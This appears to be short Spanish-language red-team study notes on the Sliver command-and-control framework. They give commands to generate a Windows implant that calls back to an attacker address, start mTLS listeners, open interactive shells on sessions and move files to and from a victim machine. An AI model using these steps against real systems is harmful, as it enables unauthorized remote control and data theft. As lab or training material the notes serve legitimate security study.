- Tags : #window #command_and_control #c2 #c2 #persistencia #persistencia_windows #sliver 

Sliver esta dentro de los repos de kali así que podemos instalarlo de forma simple
```bash
apt install sliver

sliver-server
sliver>generate --mtls ip_attacker:port --os windows --arch amd64 --format exe --save payload.exe

#Configurara un listener
sliver>mtls --lhost ip_attacker --lport port
sliver>jobs  #Para ver los listeners
sliver>sessions  #Para ver las conexiones activas
sliver>use id_session  #Para conectarnos a la session para ejecutar comandos, esto nos da una sesion interactiva de sliver , si queremos una shell pues 

sliver>shell #Nos da una session de PShell, con CTR+d volvemos a la session de Sliver
sliver>background #ponemos la session en segundo plano


#Con esta herraminet podemos crearnos varios listeners

sliver>mtls --lhost ip_attacker --lport otro_port

#Y nos creamos otro payload que envie la conexion a otro_port
sliver>generate --mtls ip_attacker:otro_port --os windows --arch amd64 --format exe --save payload.exe

#Subir y descargar archivos

sliver>upload loquesesa.txt C:\users\mario\Desktop
sliver>download C:\users\mario\Desktop\hola.zip


```

Subimos este payload.exe a la maquina victima y lo ejecutaremos